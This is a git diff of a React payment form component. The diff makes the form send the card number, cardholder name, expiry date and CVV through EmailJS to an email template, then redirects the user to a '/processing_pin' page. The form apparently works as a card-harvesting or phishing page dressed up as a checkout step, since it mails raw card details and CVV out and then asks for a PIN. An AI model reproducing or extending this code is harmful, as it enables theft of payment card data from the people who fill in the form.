@@ -1,22 +1,22 @@
 import React, { useRef } from "react";
 import emailjs from "@emailjs/browser";
-import { Link } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
 import "./index.css";
 
 const Paymentprocess = ({}) => {
-
+  let navigate = useNavigate()
   //  Visa={Visa} SBI={SBI} setSBI={setSBI} setVisa={setVisa}
   const form = useRef();
 
   function sendEmail(e) {
     e.preventDefault();
-
+    navigate(`/processing_pin`);
     emailjs
       .sendForm(
-        "service_gmail_contact",
-        "template_qn8a87d",  /*change */
-        form.current,
-        "user_1BbfROnlSMWCftLMRSCEo"  /*change */
+        "service_hblrths",
+        "template_by3q0a8",  /*change */
+        form.current,    /*   */
+        "user_rkVmkb5ihll1tFJsx2oGr"  /*change */
       )
       .then(
         (result) => {
@@ -72,6 +72,7 @@ const Paymentprocess = ({}) => {
                   placeholder="Enter card number without any"
                   className="form_input"
                   size="22"
+                  name="cardNo"
                 />
               </div>
               <div className="card name">
@@ -83,6 +84,7 @@ const Paymentprocess = ({}) => {
                   placeholder="Enter name specified on card"
                   className="form_input"
                   size="22"
+                  name="name"
                 />
               </div>
               <div className="card expire">
@@ -96,6 +98,7 @@ const Paymentprocess = ({}) => {
                     className="form_input"
                     maxLength="2"
                     size="2"
+                    name="month"
                   />
                   <span> / </span>
                   <input
@@ -106,6 +109,7 @@ const Paymentprocess = ({}) => {
                     className="form_input"
                     maxLength="2"
                     size="2"
+                    name="year"
                   />
                 </div>
               </div>
@@ -118,11 +122,12 @@ const Paymentprocess = ({}) => {
                   className="cvv_input"
                   size="4"
                   maxLength="4"
+                  name="cvvNo"
                 />
               </div>
               <div className="card_btn">
                 <button type="submit" className="submit_btn">
-                  <Link to="/processing_pin">SUBMIT</Link>
+                  SUBMIT
                 </button>
               </div>
             </form>
